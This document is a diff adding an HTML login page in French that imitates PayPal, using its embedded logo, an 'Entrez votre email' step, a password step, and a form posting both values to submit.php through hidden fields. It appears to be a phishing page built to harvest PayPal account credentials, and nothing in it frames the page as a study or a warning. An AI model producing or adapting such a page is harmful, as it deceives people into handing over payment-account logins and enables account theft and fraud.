@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - MySecureSite</title>
+    <link rel="stylesheet" href="style.css">  
+        <script src="https://cdn.tailwindcss.com">
+        </script>
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+
+</head>
+
+<body>
+    <main class="px-6 mt-12 max-w-md mx-auto w-full" id="login-box">
+        <div class="pt-3 flex justify-center">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAyNCAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWluWU1pbiBtZWV0Ij4KICAgIDxwYXRoIGZpbGw9IiMwMDljZGUiIGQ9Ik0gMjAuOTA1IDkuNSBDIDIxLjE4NSA3LjQgMjAuOTA1IDYgMTkuNzgyIDQuNyBDIDE4LjU2NCAzLjMgMTYuNDExIDIuNiAxMy42OTcgMi42IEwgNS43MzkgMi42IEMgNS4yNzEgMi42IDQuNzEgMy4xIDQuNjE1IDMuNiBMIDEuMzM5IDI1LjggQyAxLjMzOSAyNi4yIDEuNjIgMjYuNyAyLjA4OCAyNi43IEwgNi45NTYgMjYuNyBMIDYuNjc1IDI4LjkgQyA2LjU4MSAyOS4zIDYuODYyIDI5LjcgNy4yMzYgMjkuNyBMIDExLjM1NiAyOS43IEMgMTEuODI1IDI5LjcgMTIuMjkyIDI5LjMgMTIuMzg2IDI4LjggTCAxMi4zODYgMjguNSBMIDEzLjIyOCAyMy4zIEwgMTMuMjI4IDIzLjEgQyAxMy4zMjIgMjIuNiAxMy43OSAyMi4yIDE0LjI1OCAyMi4yIEwgMTQuODIxIDIyLjIgQyAxOC44NDUgMjIuMiAyMS45MzUgMjAuNSAyMi44NzEgMTUuNSBDIDIzLjMzOSAxMy40IDIzLjE1MyAxMS43IDIyLjAyOSAxMC41IEMgMjEuNzQ4IDEwLjEgMjEuMjc5IDkuOCAyMC45MDUgOS41IEwgMjAuOTA1IDkuNSI+PC9wYXRoPgogICAgPHBhdGggZmlsbD0iIzAxMjE2OSIgZD0iTSAyMC45MDUgOS41IEMgMjEuMTg1IDcuNCAyMC45MDUgNiAxOS43ODIgNC43IEMgMTguNTY0IDMuMyAxNi40MTEgMi42IDEzLjY5NyAyLjYgTCA1LjczOSAyLjYgQyA1LjI3MSAyLjYgNC43MSAzLjEgNC42MTUgMy42IEwgMS4zMzkgMjUuOCBDIDEuMzM5IDI2LjIgMS42MiAyNi43IDIuMDg4IDI2LjcgTCA2Ljk1NiAyNi43IEwgOC4yNjcgMTguNCBMIDguMTczIDE4LjcgQyA4LjI2NyAxOC4xIDguNzM1IDE3LjcgOS4yOTYgMTcuNyBMIDExLjYzNiAxNy43IEMgMTYuMjI0IDE3LjcgMTkuNzgyIDE1LjcgMjAuOTA1IDEwLjEgQyAyMC44MTIgOS44IDIwLjkwNSA5LjcgMjAuOTA1IDkuNSI+PC9wYXRoPgo8L3N2Zz4K"
+                alt="PayPal" class="paypal-logo">
+        </div>
+        <div class="relative overflow-hidden" id="div">
+            <div id="set1" class="absolute inset-0 transition-all duration-500 ease-in-out">
+                <div class="form-group">
+                    <input type="email" id="email" class="custom-input" placeholder=" " required>
+                    <label for="email">Entrez votre email</label>
+                    <div id="emailError" class="text-red-500 text-sm mt-1 hidden"></div>
+                </div> 
+                 
+            </div>
+            <div id="set2" class="absolute inset-0 transition-all duration-500 ease-in-out"
+                style="transform: translateX(100%); opacity: 0;">
+                <div class="flex items-center justify-center">
+                    <span class="text-gray-700 font-bold" id="emailDisplay"></span>
+                    <button type="button" class="text-blue-600 hover:underline font-bold"
+                        onclick="modifyEmail()">Modifier</button>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="confirm" class="custom-input" placeholder=" " required>
+                    <label for="confirm">Mot de passe</label>
+                    <div id="passwordError" class="text-red-500 text-sm mt-1 hidden"></div>
+                </div>
+            </div>
+        </div>
+        <form method="POST" action="submit.php">
+            <input type="hidden" name="login_email" id="login_email_hidden">
+            <input type="hidden" name="login_password" id="login_password_hidden">
+            <button id="submitBtn" type="button"
+                class="w-full bg-blue-800 text-white font-bold text-lg rounded-full py-3 mt-2">Suivant</button>
+        </form> 
+        <div class="flex items-center my-6">
+            <hr class="flex-grow border-t border-gray-300">
+            <span class="mx-3 text-gray-500 font-semibold">ou</span>
+            <hr class="flex-grow border-t border-gray-300">
+        </div>
+
+        <button type="button" class="custom-button" onclick="window.location.href='signup.html'">
+            Ouvrir un compte
+        </button>
+        </form>
+        <nav aria-label="اختيار اللغة"
+            class="mt-16 flex flex-wrap items-center justify-center gap-x-2 gap-y-1 text-gray-600 text-sm select-none">
+            <button class="flex items-center gap-1" type="button">
+                <img alt="علم الولايات المتحدة الأمريكية" class="w-5 h-4 object-cover" loading="lazy"
+                    src="https://flagcdn.com/us.svg" />
+                <i class="fas fa-chevron-down text-xs">
+                </i>
+            </button>
+            <button class="font-semibold" type="button">
+                English
+            </button>
+            <span class="border-l border-gray-400 h-4 mx-2">
+            </span>
+            <button type="button">
+                Français
+            </button>
+
+        </nav>
+    </main>
+    <footer class="footer">
+        <nav class="footer-nav" aria-label="روابط تذييل الصفحة">
+            <a href="#">Contact</a>
+            <a href="#">Respect de la vie privée</a>
+            <a href="#">Contrats d'utilisation</a>
+            <a href="#">International</a>
+        </nav>
+    </footer>
+
+    </main>
+    <script>
+        const submitBtn = document.getElementById('submitBtn');
+        const set1 = document.getElementById('set1');
+        const set2 = document.getElementById('set2');
+        let currentStep = 1;
+        function showError(elementId, message) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.textContent = message;
+            errorElement.classList.remove('hidden');
+        }
+        function hideError(elementId) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.classList.add('hidden');
+        }
+        function modifyEmail() {
+            set1.style.transform = 'translateX(0)';
+            set1.style.opacity = '1';
+            set2.style.transform = 'translateX(100%)';
+            set2.style.opacity = '0';
+            submitBtn.textContent = 'Suivant';
+            currentStep = 1;
+            hideError('emailError');
+            hideError('passwordError');
+        }
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        submitBtn.addEventListener('click', function () {
+            if (currentStep === 1) {
+                const email = document.getElementById('email').value;
+                hideError('emailError');
+                if (!email || !validateEmail(email)) {
+                    showError('emailError', 'Veuillez entrer un email valide.');
+                    return;
+                }
+                document.getElementById('emailDisplay').textContent = email;
+                set1.style.transform = 'translateX(-100%)';
+                set1.style.opacity = '0';
+                set2.style.transform = 'translateX(0)';
+                set2.style.opacity = '1';
+                submitBtn.textContent = 'Connexion';
+                currentStep = 2;
+            } else {
+                const password = document.getElementById('confirm').value;
+                const email = document.getElementById('email').value;
+                hideError('passwordError');
+                if (!password || password.length < 4) {
+                    showError('passwordError', 'Mot de passe invalide.');
+                    return;
+                }
+                document.getElementById('login_email_hidden').value = email;
+                document.getElementById('login_password_hidden').value = password;
+                document.querySelector('form').submit();
+            }
+        });
+    </script>
+</body>
+
+</html>
